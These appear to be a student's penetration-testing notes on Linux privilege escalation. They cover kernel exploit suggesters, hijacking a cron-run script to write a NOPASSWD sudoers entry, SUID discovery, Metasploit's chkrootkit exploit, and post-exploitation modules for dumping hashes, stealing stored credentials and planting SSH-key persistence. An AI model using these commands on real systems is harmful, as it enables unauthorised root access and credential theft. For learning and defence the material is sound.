### Linux Kernel Exploits
Tool called Linux Exploit Suggester can be used. Found on github. Suggests exploits from exploit db. Get file and compile like normal and deploy. 

### Misconfigured Cron Jobs
To find where a file is being used, use grep. ex. 
```
grep -rnw /usr -e "<file path>"
```
> -r = recursive
> -w = match whole words
> -n = print the line
> -e = use the pattern provided

Method 1: find running script and edit. 
```
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```
> this will add current users to sudoers file as soon as script runs

### Exploiting SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Another method
```bash
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```

> Indicated by s in permissions (x, h, r, s)
> Look in strings to see if there are related files
> Change that file contents (or recreate) and use SUID file to run it

![](</Images/Pasted image 20231210160935.png>)

### metasploit

`ps aux` to show running processes. Some have owner for root. 

`/usr/local/bin/chkrootkit` has vulnerable versions < 0.50
`chkrootkit -V` to see if version is less than 0.5

Exit shell and background  meterpreter. Search for chkroot kit
`exploit/unix/local/chkrootkit`
Manually configure:
set session
set path (CHKROOTKIT) if different
set LHOST to eht1 or equiv

### dumping hashes

After creating session use `linux/gather/hashdump`
Creates unshadowed password file

Other modules for gathering info post expliot
- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets - gets PPTP user/pass/IP info
- post/linux/manage/sshkey_persistence

check for SUID and/or sudo -l

man no passwd can escape with !

LinEnum - automatic linux enum found on github
LinPeas: file is way too big to copy and paste
[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh): this works well to tell what is available. But doesn't give actual detail. Changing level to 1 or 2 will give more information


How to find files that every user can write to files
`find / -not -type l -perm -o+w`

Generate linux hashed password for shadow file
`openssl passwd -1 -salt abc password`
